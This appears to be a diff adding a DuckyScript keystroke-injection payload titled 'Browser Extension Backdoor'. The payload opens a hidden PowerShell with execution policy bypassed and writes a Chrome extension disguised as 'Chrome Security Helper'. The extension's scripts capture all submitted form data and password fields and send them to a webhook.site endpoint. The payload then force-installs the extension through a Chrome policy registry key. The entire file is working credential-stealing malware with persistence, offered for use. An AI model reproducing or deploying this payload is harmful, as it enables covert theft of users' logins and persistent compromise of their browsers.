@@ -1,0 +1,56 @@
+REM =============================================
+REM Title: Browser Extension Backdoor
+REM Author: bad-antics
+REM Description: Install persistent browser extension
+REM Category: nullsec/persist
+REM Target: Windows 10/11 (Chrome)
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create extension directory
+STRING $extPath="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\nullsec_ext";mkdir $extPath -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Create manifest.json
+STRING @'
+{"manifest_version":3,"name":"Chrome Security Helper","version":"1.0","description":"Security updates","permissions":["storage","tabs","webRequest","cookies","<all_urls>"],"background":{"service_worker":"bg.js"},"content_scripts":[{"matches":["<all_urls>"],"js":["cs.js"]}]}
+'@|Out-File "$extPath\manifest.json" -Encoding UTF8
+ENTER
+DELAY 200
+
+REM Create background script - keylog and form grabber
+STRING @'
+chrome.webRequest.onBeforeRequest.addListener(d=>{if(d.method=="POST"&&d.requestBody){let f=d.requestBody.formData;if(f){fetch("https://webhook.site/YOUR-ID",{method:"POST",body:JSON.stringify({url:d.url,form:f})})}}},{urls:["<all_urls>"]},["requestBody"]);
+'@|Out-File "$extPath\bg.js" -Encoding UTF8
+ENTER
+DELAY 200
+
+REM Create content script
+STRING @'
+document.querySelectorAll('input[type="password"]').forEach(i=>{i.addEventListener("change",e=>{fetch("https://webhook.site/YOUR-ID",{method:"POST",body:JSON.stringify({site:location.href,user:document.querySelector('input[type="email"],input[type="text"]')?.value,pass:e.target.value})})})});
+'@|Out-File "$extPath\cs.js" -Encoding UTF8
+ENTER
+DELAY 200
+
+REM Force install extension via registry
+STRING $regPath="HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
+ENTER
+DELAY 100
+
+STRING if(!(Test-Path $regPath)){New-Item -Path $regPath -Force|Out-Null}
+ENTER
+DELAY 100
+
+STRING Set-ItemProperty -Path $regPath -Name "1" -Value "$extPath;Chrome Security Helper"
+ENTER
+DELAY 200
+
+STRING exit
+ENTER
